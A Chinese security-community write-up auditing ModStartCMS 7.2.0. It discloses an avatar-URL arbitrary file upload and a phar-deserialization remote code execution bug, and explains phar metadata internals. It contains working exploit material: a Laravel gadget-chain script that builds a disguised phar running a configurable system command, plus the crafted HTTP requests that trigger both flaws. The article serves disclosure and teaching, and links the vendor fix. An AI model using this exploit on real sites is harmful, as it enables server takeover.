

# 奇安信攻防社区-ModStartCMS-7.2.0 代码审计

### ModStartCMS-7.2.0 代码审计

本篇文章通过代码审计发现ModStartCMS的RCE漏洞，描述了如何运用 phar 进行 php 反序列化漏洞利用的过程，并提供进一步了解 phar 的相关内容，帮助大家更好的审计出Phar反序列化漏洞。

# 0x00 前言

ModStart 是一个基于 Laravel 的模块化快速开发框架。由西安炎燚信息科技有限公司开发，团队成立于2016年，是一家专业从事互联网应用服务、云计算、大数据、人工智能、企业信息化建设的技术型企业。

本篇文章通过代码审计发现ModStartCMS的RCE漏洞，描述了如何运用 phar 进行 php 反序列化漏洞利用的过程，并提供进一步了解 phar 的相关内容，帮助大家更好的审计出Phar反序列化漏洞。

# 0x01 声明

**遵纪守法**  
公网上存在部署了旧版本的CMS，旧版本仍然存在这些问题。  
请不要非法攻击别人的服务器，如果你是服务器主人请升级到最新版本。  
请严格遵守网络安全法相关条例！此分享主要用于交流学习，请勿用于非法用途，一切后果自付。  
一切未经授权的网络攻击均为违法行为，互联网非法外之地。

# 0x02 环境

系统版本：ModStartCMS-7.2.0  
系统环境：Window11  
PHP版本：7.0.9NTS  
数据库版本：5.7.26  
Web服组件务：Nginx1.15.11  
源码下载地址：[https://gitee.com/modstart/ModStartCMS](https://gitee.com/modstart/ModStartCMS)

# 0x03 安装

[PHPStudy安装ModStart | ModStart开发者文档](https://modstart.com/doc/install/phpstudy.html#%E8%AE%BE%E7%BD%AE%E9%98%B2%E6%AD%A2%E8%AD%A6%E5%91%8A%E5%8F%82%E6%95%B0)

# 0x04 代码审计

## 【高危】前台任意文件上传漏洞

### 漏洞详情

在实现上传头像功能上，存在远程拉取图片的方法，使用了`CurlUtil::getRaw`远程获取文件内容并通过`file_put_contents`保存该文件到`temp`目录下。攻击者可以构造恶意的URL，利用这个功能来上传恶意文件。

### 漏洞复现

新建一个命名为`help.php`的文件，内容为：

```php
<?=phpinfo();?>
```

在文件目录下使用`python -m http.server 19980`

![document_image_rId7.png](assets/1704861626-d233e1a625d3fcac423d410bab036843.png)

访问 [http://localhost:38201/register](http://localhost:38201/register) 任意注册账号。

![document_image_rId8.png](assets/1704861626-5cc17ca30353f95ccfc0ac853f874f24.png)

访问 [http://localhost:38201/login](http://localhost:38201/login) 进行登录，登录成功后找到修改头像功能点。  
[http://localhost:38201/member\_profile/avatar](http://localhost:38201/member_profile/avatar)

![document_image_rId9.png](assets/1704861626-3b56173f58ea548dbadc134341d571d6.png)

任意上传一张图片并进行抓包修改。  
原始数据包：

![document_image_rId10.png](assets/1704861626-b7eeb473a8445a77d30da38e9cd6a17b.png)

修改后：

![document_image_rId11.png](assets/1704861626-eed97eb7d7f0a26ff106604640a4c188.png)

数据包：

```php
POST /member_profile/avatar HTTP/1.1
Host: localhost:38201
Content-Length: 44
sec-ch-ua: "Not A(Brand";v="24", "Chromium";v="110"
Accept: */*
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.178 Safari/537.36
sec-ch-ua-platform: "Windows"
Origin: http://localhost:38201
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost:38201/member_profile/avatar
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: cb_lang=zh-cn; PHPSESSID=b9b3b6655310f81aa0329bfd23522581; uuid=1; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwd2QiOiIxZDlmMjExMGZlOTgzM2U1MTQ4MmQyZjdkMTFmZjFlNiIsImlzcyI6ImxvY2FsaG9zdDo0NTYwMCIsImF1ZCI6ImxvY2FsaG9zdDo0NTYwMCIsImlhdCI6MTY5NDgyODg4MCwibmJmIjoxNjk0ODI4ODgwLCJleHAiOjE2OTc0MjA4ODAsImp0aSI6eyJpZCI6MSwidHlwZSI6ImFkbWluIn19.y5r2KvC8qH8eOhSYzK07JKHvRFcUDbFgCpdFuJTa1m4; expires_time=1697420880; ssid=eyJpdiI6ImZSdFV1aHNPR2JqdkhEZEpWN1IwUHc9PSIsInZhbHVlIjoiNG04VmdheFVoNFl0VDhUWkNScjY2YnRPY0pvRWZnYlJoU0dyb3ZxVlZHRVwvRnl6S2FtYUJmSVpUaDJZXC95OCsrU1hURjVZMzlKalphTjBMS2kyZG5CQT09IiwibWFjIjoiYTYyMWI3MTE2NTBmODY0ZmFhMmVjMDg0OWVhMWQxODQzNTVlYWM3NTgzNDhmOTM2NjEyMTU0M2NjNjM2NDg2YyJ9
Connection: close

type=&avatar=http://127.0.0.1:19980/help.PHP
```

生成的文件名是md5值，摘取内容为：

```php
yMZzWpFRGBGwrBVwDiNQF0U9xl7Baqa8:http://127.0.0.1:19980/help.PHP
```

将内容md5编码后得到`ce540a9b00ee6fefa1f0ead15f2895ba`

![document_image_rId12.png](assets/1704861626-62e3836e948fe0187284962cf8e3eada.png)

访问 [http://localhost:38201/temp/ce540a9b00ee6fefa1f0ead15f2895ba.php](http://localhost:38201/temp/ce540a9b00ee6fefa1f0ead15f2895ba.php)

![document_image_rId13.png](assets/1704861626-bb09e16ef82388f10a77472c1cfa5e2c.png)

### 漏洞审计

调用链：

```php
Member/Web/Controller/MemberProfileController.php avatar 54行
    Member/Api/Controller/MemberProfileController.php avatar 83行
    vendor/modstart/modstart/src/Core/Util/FileUtil.php savePathToLocalTemp 606行
        vendor/modstart/modstart/src/Core/Util/CurlUtil.php getRaw 306行
```

从路由文件`Member/Api/routes.php`中可以找到路由`/member_profile/avatar`对应的`MemberProfileController.php`中的`avatar`函数。

![document_image_rId14.png](assets/1704861626-2d5e57bd3920bb94aabc332bd0081503.png)

跟进后来到`Member/Api/Controller/MemberProfileController.php`的`avatar`函数中进行处理。通过改变传入`type`参数的值来进入到`savePathToLocalTemp`函数中去。

`savePathToLocalTemp`函数中通过`CurlUtil::getRaw`请求了我们的链接并通过`file_put_contents`保存文件到`$tempPath`指定的目录。这种拼接方式是可以被预测的 ，`$appKey`默认为`yMZzWpFRGBGwrBVwDiNQF0U9xl7Baqa8`。

```php
ublic_path('temp/' . md5($appKey . ':' . $path) . (starts_with($ext, '.') ? $ext : '.' . $ext));
```

![document_image_rId15.png](assets/1704861626-c7b021b77e077ad46d64e7e974954504.png)

![document_image_rId16.png](assets/1704861626-1e1972172905432f021b645a3a75ba18.png)

> 漏洞修复请看[文件恶意上传漏洞公告 | ModStart](https://modstart.com/security/news/1)

## 【高危】前台远程命令执行（RCE）漏洞

### 漏洞详情

在实现上传头像功能时，不安全的使用了`file_exists`函数，将未经校验的数据传递给了该函数。攻击者可以构造恶意的phar文件，使用phar协议触发反序列化，造成远程执行漏洞。

### 漏洞复现

步骤：

1.  注册账号并登录
2.  上传带有反序列化利用的phar文件
3.  通过 file\_exists 函数触发phar协议
4.  **注册账号并登录**

访问 [http://localhost:38201/register](http://localhost:38201/register) 任意注册账号。

![document_image_rId18.png](assets/1704861626-1d93d4593839862e76a5dd0b765883ac.png)

访问 [http://localhost:38201/login](http://localhost:38201/login) 进行登录

2.  **注册账号并登录**

在任意文件夹下创建命名为`index.html`文件，内容为：

```php

<html>
<head>
    <meta charset="UTF-8">
    <title>文件上传表单</title>
</head>
<body>

<h1>文件上传</h1>

<form action="http://localhost:38201/member_data/file_manager/file?action=uploadDirect" method="post" enctype="multipart/form-data">
    <label for="file">选择要上传的文件:</label>
    <input type="file" name="file" id="file">
    <br><br>
    <input type="submit" value="上传文件">
</form>

</body>
</html>
```

在文件目录下使用`python -m http.server 19980`

3.  **生成EXP phar文件**

在Public文件夹下新建命名为exp.php文件，内容如下

```php
<?php
namespace Illuminate\Database;
class DatabaseManager{
    protected $extensions = array();
    protected $app=array();
    public function __construct(){
        $this->extensions['calc.exe']='call_user_func';
        $this->app['config']['database.connections']=['calc.exe'=>'system'];
        $this->app['config']['database.default'] = 'calc.exe';
    }
}

namespace Illuminate\View;
use Illuminate\Database\DatabaseManager;
class View{
    protected $factory;
    public function __construct(){
        $this->factory=new DatabaseManager;
    }
}

namespace Symfony\Component\Process\Pipes;
use Illuminate\View\View;
use Phar;

class WindowsPipes{
    private $files = array();
    public function __construct(){
        $this->files = array(new View());
    }
}
//echo urlencode(serialize(new WindowsPipes()));
$exp=new WindowsPipes();
//echo base64_encode(serialize($exp));
@unlink("laravel5_exp.phar");
$phar = new Phar("laravel5_exp.phar"); //后缀名必须为phar
$phar->startBuffering();
$phar->setStub("GIF89a<?php __HALT_COMPILER(); ?>"); //设置stub
$phar->setMetadata($exp); //将自定义的meta-data存入manifest
$phar->addFromString("test.txt", "test"); //添加要压缩的文件
//签名自动计算
$phar->stopBuffering();
?>
```

运行后得到`laravel5_exp.phar`文件，重命名为`laravel5_exp.jpg`。

> 如果要自定义命令，请将内容中的`calc.exe`全部替换成自定义命令。保持统一。

4.  **上传phar文件**

在**相同游览器**访问`http://localhost:19980/`页面，选择并上传`laravel5_exp.jpg`文件。

![document_image_rId19.png](assets/1704861626-15b274b86a2f1d7906d506c1f82ca257.png)

上传后得到路径`\/data\/file\/2023\/09\/22\/28396_a9tq_5362.jpg`

![document_image_rId20.png](assets/1704861626-a984272b3b0e979507db57d4956ee2ca.png)

5.  **触发phar协议造成反序列化**

[http://localhost:38201/member\_profile/avatar](http://localhost:38201/member_profile/avatar)

![document_image_rId21.png](assets/1704861626-248c867bc26b2e5797e30ad390d4ea53.png)

任意上传一张图片并进行抓包修改。  
原始数据包：

![document_image_rId22.png](assets/1704861626-aebeb7afba021234b36f088695b4236a.png)

修改`type`为空，`avatar`为phar协议，路径为上个步骤获取的路径。  
修改后：

![document_image_rId23.png](assets/1704861626-487e6cf4c9f0c57dcee11a49ad446c4b.png)

数据包：

```php
POST /member_profile/avatar HTTP/1.1
Host: localhost:38201
Content-Length: 62
sec-ch-ua: "Not A(Brand";v="24", "Chromium";v="110"
Accept: */*
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.178 Safari/537.36
sec-ch-ua-platform: "Windows"
Origin: http://localhost:38201
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost:38201/member_profile/avatar
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: cb_lang=zh-cn; PHPSESSID=b9b3b6655310f81aa0329bfd23522581; uuid=1; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwd2QiOiIxZDlmMjExMGZlOTgzM2U1MTQ4MmQyZjdkMTFmZjFlNiIsImlzcyI6ImxvY2FsaG9zdDo0NTYwMCIsImF1ZCI6ImxvY2FsaG9zdDo0NTYwMCIsImlhdCI6MTY5NDgyODg4MCwibmJmIjoxNjk0ODI4ODgwLCJleHAiOjE2OTc0MjA4ODAsImp0aSI6eyJpZCI6MSwidHlwZSI6ImFkbWluIn19.y5r2KvC8qH8eOhSYzK07JKHvRFcUDbFgCpdFuJTa1m4; expires_time=1697420880; ssid=eyJpdiI6ImZSdFV1aHNPR2JqdkhEZEpWN1IwUHc9PSIsInZhbHVlIjoiNG04VmdheFVoNFl0VDhUWkNScjY2YnRPY0pvRWZnYlJoU0dyb3ZxVlZHRVwvRnl6S2FtYUJmSVpUaDJZXC95OCsrU1hURjVZMzlKalphTjBMS2kyZG5CQT09IiwibWFjIjoiYTYyMWI3MTE2NTBmODY0ZmFhMmVjMDg0OWVhMWQxODQzNTVlYWM3NTgzNDhmOTM2NjEyMTU0M2NjNjM2NDg2YyJ9
Connection: close

type=&avatar=phar://./data/file/2023/09/22/28396_a9tq_5362.jpg
```

请求后可以执行我们想要的命令。

![document_image_rId24.png](assets/1704861626-983f7cc3a72c2dccd49efd4b16b405d6.png)

### 漏洞审计

调用链：

```php
Member/Web/Controller/MemberProfileController.php avatar 54行
    Member/Api/Controller/MemberProfileController.php avatar 83行
    vendor/modstart/modstart/src/Core/Util/FileUtil.php savePathToLocalTemp 606行
        vendor/modstart/modstart/src/Core/Util/FileUtil.php file_exists 608行
```

从路由文件`Member/Api/routes.php`中可以找到路由`/member_profile/avatar`对应的`MemberProfileController.php`中的`avatar`函数。

![document_image_rId26.png](assets/1704861626-a3bd33f4e0018f0992bf0793e22b9dc7.png)

跟进后来到`Member/Api/Controller/MemberProfileController.php`的`avatar`函数中进行处理。通过改变传入`type`参数的值来进入到`savePathToLocalTemp`函数中去。

![document_image_rId27.png](assets/1704861626-eef620080f73526ba468fea688fba93c.png)

传入的路径会先通过`file_exists`函数进行判断，这个函数可以触发phar协议，执行反序列化，造成命令执行。

![document_image_rId28.png](assets/1704861626-2d353b2af2bf55748a36d08dd47df588.png)

# 0x05 认识 Phar 元数据自动反序列化

Phar （PHp ARchive） 文件是一种使用单一文件格式（类似于 JAR 文件在 Java 生态系统中的工作方式）分发 PHP 应用程序和库的方法。从结构上讲，它们只是存档（带有可选的 gzip 压缩或基于 zip 的 tar 文件）。

> 安全研究员Sam Thomas分享了议题 [It’s a PHP unserialization vulnerability Jim, but not as we know it](https://i.blackhat.com/us-18/Thu-August-9/us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It-wp.pdf)

实际上在PHP 8.0之前，当使用Phar流包装器时，它会自动尝试反序列化Phar元数据。即在对Phar文件进行任何文件操作时会将文件中的`meta-data`进行反序列化。

## PHP8.0 后的变化

在`php-src/ext/phar/phar.c`中我们可以找到`meta-data`处理的函数`phar_metadata_tracker_unserialize_or_copy`。在PHP 8.1中，流包装器函数不再尝试自动反序列化元数据。只有显式调用`Phar::getMetadata`和`PharFileInfo::getMetadata`方法时才会尝试反序列化Phar元数据。  
观察代码，这里增加了`options`，它的内容是在Phar文件定义的。

```c
$phar = new Phar('path/to/phar.phar');
$phar->getMetadata(['allowed_classes' => []]);
```

![document_image_rId30.png](assets/1704861626-453e81c9145f08891ef627f9b0f66cc9.png)

具体处理函数`php_unserialize_with_options`可以在`php-src/ext/standard/var.c`中找到。

![document_image_rId31.png](assets/1704861626-6c0a1b274f704c0b5d272a5b6e9fb49a.png)

首先检查`allowed_classes`是否为数组、布尔值或未设置。如果是数组或布尔值，它会创建一个哈希表`class_hash`来存储允许的类。然后，它遍历`allowed_classes`数组，将类名添加到`class_hash`中。  
最终，`class_hash`会被传递给`php_var_unserialize_set_allowed_classes`函数，这将限制在反序列化时允许的类。这样，通过设置`allowed_classes`选项，代码实现了对允许的类进行限制。

```c
if (options != NULL) {
    zval *classes, *max_depth;

    classes = zend_hash_str_find_deref(options, "allowed_classes", sizeof("allowed_classes")-1);
    if (classes && Z_TYPE_P(classes) != IS_ARRAY && Z_TYPE_P(classes) != IS_TRUE && Z_TYPE_P(classes) != IS_FALSE) {
        zend_type_error("%s(): Option \"allowed_classes\" must be of type array|bool, %s given", function_name, zend_zval_value_name(classes));
        goto cleanup;
    }

    if(classes && (Z_TYPE_P(classes) == IS_ARRAY || !zend_is_true(classes))) {
        ALLOC_HASHTABLE(class_hash);
        zend_hash_init(class_hash, (Z_TYPE_P(classes) == IS_ARRAY) ? zend_hash_num_elements(Z_ARRVAL_P(classes)) : 0, NULL, NULL, 0);
    }
    if(class_hash && Z_TYPE_P(classes) == IS_ARRAY) {
        // 处理 allowed_classes 选项
    }

    // 处理 max_depth 选项
}
```

从下面代码看，尽管我们不传递`options`保持为NULL一样可以进入到`php_var_unserialize`函数中去。这种代码属于向后兼容性。

![document_image_rId32.png](assets/1704861626-7a30e4c58a0112f4c21bcb9b9337d2da.png)

在`php-src/ext/phar/phar_object.c`我们可以了解到，`Phar::getMetadata`C 扩展宏定义。

![document_image_rId33.png](assets/1704861626-0d77264de7a3e842384c7e97ba0312e0.png)

这里逻辑做了两部分工作：  
1、获取 metadata tracker

```c
tracker = &phar_obj->archive->metadata_tracker;
```

通过`phar_obj`对象获取 Phar 归档对象，然后获取与该归档对象关联的`metadata tracker`。`metadata_tracker`负责跟踪归档的元数据信息。  
2、检查是否有数据并获取数据

```c
if (phar_metadata_tracker_has_data(tracker, phar_obj->archive->is_persistent)) {
   phar_metadata_tracker_unserialize_or_copy(tracker, return_value, phar_obj->archive->is_persistent, unserialize_options, "Phar::getMetadata");
}
```

检查`metadata tracker`是否包含数据，如果是，则调用`phar_metadata_tracker_unserialize_or_copy`函数，该函数用于将元数据反序列化或复制到`return_value`中。`is_persistent`参数表示是否是持久化的 Phar 归档。  
在文件`php-src/ext/phar/phar_object.stub.php`中可以找到对应接口定义

```c
public function getMetadata(array $unserializeOptions = []): mixed {}
```

![document_image_rId34.png](assets/1704861626-09b37ffc484c9effab8fc948d270218f.png)

以下列举出能触发 phar 反序列化的函数：

```c
copy                file_exists         file_get_contents   file_put_contents   
file                fileatime           filectime           filegroup           
fileinode           filemtime           fileowner           fileperms           
filesize            filetype            fopen               is_dir              
is_executable       is_file             is_link             is_readable         
is_writable         lstat               mkdir               parse_ini_file      
readfile            rename              rmdir               stat                
touch               unlink              getimagesize        fstat
fseek               opendir             require_once        include_once
require             include             scandir             highlight_file
```

除了上述代码，还有其他函数需要我们去发现。

> 参考文章：  
> [PHP 8.0: phar:// stream wrapper no longer unserializes meta data automatically](https://php.watch/versions/8.0/phar-stream-wrapper-unserialize)  
> [PHP: rfc:phar\_stop\_autoloading\_metadata](https://wiki.php.net/rfc/phar_stop_autoloading_metadata)  
> [Exploiting PHP Phar Deserialization Vulnerabilities: Part 1](https://www.keysight.com/blogs/en/tech/nwvs/2020/07/23/exploiting-php-phar-deserialization-vulnerabilities-part-1)

# 0x06 总结

Phar 反序列化在非常多的地方可以实现攻击，它的灵活性让PHP感到头疼。因为他尽管在文件上传后缀限制的情况下，依旧可以实现反序列化攻击。这项技术在18年提出，可开发人员对其了解甚少，对它的过滤几乎没有，并且这几年来都提出绕过简单防御的可能性。虽然在CTF中Web题目已经不屑于出该类型的题目，但它依旧值得我们去了解以及学习。
